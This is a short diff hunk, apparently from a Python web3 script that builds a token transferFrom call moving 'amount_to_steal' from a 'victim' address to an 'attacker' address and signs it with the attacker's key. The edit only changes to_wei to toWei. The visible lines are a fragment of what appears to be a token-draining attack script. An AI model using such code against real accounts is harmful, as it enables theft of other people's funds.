@@ -33,7 +33,7 @@ tx2 = token.functions.transferFrom(victim, attacker, amount_to_steal).build_tran
     "from": attacker,
     "nonce": w3.eth.get_transaction_count(attacker),
     "gas": 200000,
-    "gasPrice": w3.to_wei("5", "gwei")
+    "gasPrice": w3.toWei("5", "gwei")
 })
 # Sign and send with attacker's private key
 
